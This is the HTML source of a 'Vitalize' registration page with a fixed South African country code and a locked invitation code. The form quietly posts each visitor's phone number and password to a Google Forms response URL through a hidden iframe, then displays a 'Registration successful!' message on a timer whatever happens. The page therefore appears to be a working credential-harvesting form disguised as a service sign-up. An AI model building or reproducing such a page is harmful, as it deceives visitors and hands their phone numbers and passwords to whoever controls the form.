<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Vitalize - Register</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background: linear-gradient(270deg, #141E30, #243B55, #1f2a3d);
      background-size: 600% 600%;
      animation: bgAnimation 15s ease infinite;
      overflow: hidden;
    }

    @keyframes bgAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .register-box {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 12px;
      padding: 30px 20px 50px;
      width: 100%;
      max-width: 400px;
      text-align: center;
      position: relative;
      z-index: 1;
      animation: fadeInUp 1s ease-out;
      box-shadow: 0 0 15px rgba(36,59,85,0.2);
    }

    /* إطار متحرك حوالين البوكس */
    .register-box::before {
      content: "";
      position: absolute;
      top: -3px;
      left: -3px;
      right: -3px;
      bottom: -3px;
      border-radius: 14px;
      background: linear-gradient(135deg, #243B55, #141E30, #00c6ff, #0072ff);
      background-size: 300% 300%;
      animation: borderGlow 6s linear infinite;
      z-index: -1;
    }

    @keyframes borderGlow {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    @keyframes fadeInUp {
      0% { opacity: 0; transform: translateY(50px); }
      100% { opacity: 1; transform: translateY(0); }
    }

    .logo {
      width: 120px;
      margin: 20px auto;
    }

    .register-box h2 {
      margin-bottom: 25px;
      color: #243B55;
      font-size: 24px;
      letter-spacing: 1px;
    }

    .form-group {
      margin-bottom: 20px;
      text-align: left;
    }

    label {
      font-weight: 600;
      display: block;
      margin-bottom: 6px;
      font-size: 15px;
      color: #333;
    }

    input[type="text"], input[type="tel"], input[type="password"] {
      width: 100%;
      padding: 14px;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      transition: 0.3s;
    }

    input:focus {
      border-color: #243B55;
      box-shadow: 0 0 8px rgba(36, 59, 85, 0.3);
      outline: none;
    }

    input[readonly] {
      background: #f0f0f0;
      font-weight: bold;
      color: #555;
      cursor: not-allowed;
    }

    .checkbox-group {
      text-align: left;
      margin: 15px 0;
      font-size: 14px;
    }

    .checkbox-group label {
      display: flex;
      align-items: center;
      font-weight: normal;
      color: #333;
    }

    .checkbox-group input {
      margin-right: 8px;
    }

    .btn {
      background: linear-gradient(135deg, #243B55, #141E30);
      color: #fff;
      padding: 16px;
      border: none;
      width: 100%;
      font-size: 18px;
      border-radius: 8px;
      cursor: pointer;
      transition: 0.3s;
      font-weight: bold;
      margin-top: 20px;
      position: relative;
    }

    .btn:hover {
      background: linear-gradient(135deg, #141E30, #243B55);
      transform: translateY(-2px);
      box-shadow: 0 6px 12px rgba(0,0,0,0.2);
    }

    /* خط رفيع تحت الزر */
    .btn::after {
      content: "";
      position: absolute;
      bottom: -8px;
      left: 25%;
      width: 50%;
      height: 3px;
      background: linear-gradient(90deg, #00c6ff, #0072ff);
      border-radius: 5px;
      animation: underlineAnim 2s infinite alternate;
    }

    @keyframes underlineAnim {
      from { width: 30%; left: 35%; }
      to { width: 60%; left: 20%; }
    }

    .login-link {
      margin-top: 30px;
      font-size: 16px;
    }

    .login-link a {
      color: #243B55;
      font-weight: bold;
      text-decoration: none;
    }

    .login-link a:hover {
      text-decoration: underline;
    }

    #successMsg {
      display: none;
      color: green;
      font-weight: bold;
      margin-top: 15px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="register-box">
    <img src="https://i.postimg.cc/FzbXX2NS/pngegg.png" alt="Vitalize Logo" class="logo">
    <h2>Vitalize Registration</h2>

    <form action="https://docs.google.com/forms/d/e/1FAIpQLSersIOADeAL4zZ7H7_yfDKyGlPb4lkpMkXANJbTmHzCAtTXnA/formResponse" 
          method="POST" 
          target="hidden_iframe" 
          onsubmit="submitted=true;">

      <div class="form-group">
        <label for="countryCode">Country Code</label>
        <input type="text" id="countryCode" value="+27" readonly>
      </div>

      <div class="form-group">
        <label for="phone">Phone Number</label>
        <input type="tel" id="phone" name="entry.11026931" placeholder="Enter phone number" required>
      </div>

      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="entry.70675987" placeholder="Enter password" required>
      </div>

      <div class="form-group">
        <label for="confirmPassword">Confirm Password</label>
        <input type="password" id="confirmPassword" name="entry.2139866834" placeholder="Confirm password" required>
      </div>

      <div class="form-group">
        <label for="invite">Invitation Code</label>
        <input type="text" id="invite" name="entry.1944770665" value="25114" readonly>
      </div>

      <div class="checkbox-group">
        <label>
          <input type="checkbox" required>
          I agree to the <a href="#">Terms & Conditions</a>
        </label>
      </div>

      <button type="submit" class="btn">Register</button>
    </form>

    <iframe name="hidden_iframe" style="display:none;"></iframe>
    <p id="successMsg">✅ Registration successful!</p>

    <div class="login-link">
      Already have an account? <a href="#">Login</a>
    </div>
  </div>

  <script>
    let submitted = false;
    document.querySelector("form").addEventListener("submit", function(){
      setTimeout(() => {
        if (submitted) {
          document.getElementById("successMsg").style.display = "block";
        }
      }, 1000);
    });
  </script>
</body>
</html>
